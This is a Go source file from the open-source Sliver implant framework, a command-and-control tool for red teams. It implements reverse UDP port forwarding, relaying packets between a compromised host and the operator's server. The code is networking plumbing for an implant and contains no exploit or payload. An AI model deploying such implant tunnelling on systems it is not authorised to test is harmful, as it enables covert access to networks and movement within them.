package comm

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"context"
	"encoding/gob"
	"fmt"
	"io"
	"net"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/bishopfox/sliver/protobuf/commpb"
)

// ListenUDP - Starts a UDP listener (only slightly different behavior from a UDP handler).
func ListenUDP(handler *commpb.Handler) error {

	// Create a new UDP listener: this starts listening on the host.
	ln, err := newListenerUDP(handler)
	if err != nil {
		return err
	}

	// {{if .Config.Debug}}
	log.Printf("Starting Raw UDP listener on %s:%d", handler.LHost, handler.LPort)
	// {{end}}

	// We can cut the Packet connection any time we want.
	Listeners.Add(ln)

	// Start processing packets coming from the host and route them back to server.
	go ln.handleWrite()

	// Only then we write the data coming from the server,
	// as we're ready to get the response.
	go ln.handleRead()

	return nil
}

// listenerUDP - A slightly modified udpHandler, which is used for reverse UDP portforwarding,
// or reverse UDP handlers in general. The listener has only one "UDP Conn", which in fact is
// just a UDP listener which can receive packets from any source address.
//
// This listener may thus be used for reverse portforwarding.
type listenerUDP struct {
	// Base
	info   *commpb.Handler
	ctx    context.Context    // Gives us a cancel function
	closed context.CancelFunc // Notify goroutines the forwader is closed
	mutex  sync.Mutex
	// UDP
	inbound  *net.UDPConn // implant <-> host
	outbound *udpStream   // server <-> implant
	sent     int64
	recv     int64
	errClose chan error
}

// newListenerUDP - A listener wired up to the Comm system. Listens on the host for UDP packets.
func newListenerUDP(info *commpb.Handler) (ln *listenerUDP, err error) {

	// Check the UDP address is valid
	a, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", info.RHost, info.RPort))
	if err != nil {
		return nil, fmt.Errorf("resolve: %s", err)
	}
	// Listen on it.
	conn, err := net.ListenUDP("udp", a)
	if err != nil {
		return nil, fmt.Errorf("listen: %s", err)
	}
	// Create the listener
	ln = &listenerUDP{
		info:     info,
		inbound:  conn,
		errClose: make(chan error, 1),
		mutex:    sync.Mutex{},
	}

	// Context
	ln.ctx, ln.closed = context.WithCancel(context.Background())

	return
}

func (ln *listenerUDP) Info() *commpb.Handler {
	return ln.info
}

// handleRead - Reads all packets forwarded by the server and write them to the UDP listener.
func (ln *listenerUDP) handleRead() error {

	for !isDone(ln.ctx) {
		// Get a SSH channel and bind it to the forwarder
		uc, err := ln.getStreamUDP()
		if err != nil {
			if strings.HasSuffix(err.Error(), "EOF") {
				continue
			}
		}

		//receive from channel, including source address
		p := udpPacket{}
		if err := uc.decode(&p); err == io.EOF {
			// {{if .Config.Debug}}
			log.Printf("decode error: %v", err)
			// {{end}}

			// We don't care about end of file.
			continue

		} else if err != nil {
			return fmt.Errorf("decode error: %w", err)
		}

		//write back to inbound udp
		addr, err := net.ResolveUDPAddr("udp", p.Src)
		if err != nil {
			return fmt.Errorf("resolve error: %w", err)
		}
		n, err := ln.inbound.WriteToUDP(p.Payload, addr)
		if err != nil {
			return fmt.Errorf("write error: %w", err)
		}

		//stats
		atomic.AddInt64(&ln.recv, int64(n))
	}
	return nil
}

// handleWrite - Read all UDP packets coming at the host address:port and encode them back to the server.
func (ln *listenerUDP) handleWrite() error {
	const maxMTU = 9012
	buff := make([]byte, maxMTU)

	for !isDone(ln.ctx) {
		// Read with deadline
		ln.inbound.SetReadDeadline(time.Now().Add(time.Second))
		n, addr, err := ln.inbound.ReadFromUDP(buff)
		if e, ok := err.(net.Error); ok && (e.Timeout() || e.Temporary()) {
			continue
		}
		if err != nil {
			return fmt.Errorf("read error: %w", err)
		}

		// Get a SSH channel and bind it to the forwarder
		uc, err := ln.getStreamUDP()
		if err != nil {
			if strings.HasSuffix(err.Error(), "EOF") {
				continue
			}
			fmt.Println("Error")
		}

		//send over channel, including source address
		b := buff[:n]
		if err := uc.encode(addr.String(), b); err != nil {
			if strings.HasSuffix(err.Error(), "EOF") {
				// {{if .Config.Debug}}
				log.Printf("decode error: %v", err)
				// {{end}}
				continue //dropped packet...
			}
			return fmt.Errorf("encode error: %w", err)
		}
		//stats
		atomic.AddInt64(&ln.sent, int64(n))
	}
	return nil
}

func (ln *listenerUDP) getStreamUDP() (*udpStream, error) {
	ln.mutex.Lock()
	defer ln.mutex.Unlock()

	if ln.outbound != nil {
		return ln.outbound, nil
	}

	// Get a working stream from the comm system. We transmit data over it.
	stream := Comms.server.getStream(ln.info)

	ln.outbound = &udpStream{
		r: gob.NewDecoder(stream),
		w: gob.NewEncoder(stream),
		c: stream,
	}

	return ln.outbound, nil
}

// close - Close the UDP listener.
func (ln *listenerUDP) close() (err error) {

	// Notidy goroutines we are closed
	ln.closed()

	// Close the UDP connection (listener) on the client
	ln.inbound.Close()

	// Close the UDP channel to the server
	ln.outbound.c.Close()

	return
}

// udpStream - A custom io.ReadWriteCloser that wires a udpListener to
// a Comm stream, reading from and writing to it with with encoding.
type udpStream struct {
	r *gob.Decoder
	w *gob.Encoder
	c io.Closer
}

func (o *udpStream) encode(src string, b []byte) error {
	return o.w.Encode(udpPacket{
		Src:     src,
		Payload: b,
	})
}

func (o *udpStream) decode(p *udpPacket) error {
	return o.r.Decode(p)
}

// udpPacket - A UDP packet passed beween the server and the implant Comms.
type udpPacket struct {
	Src     string
	Payload []byte
}
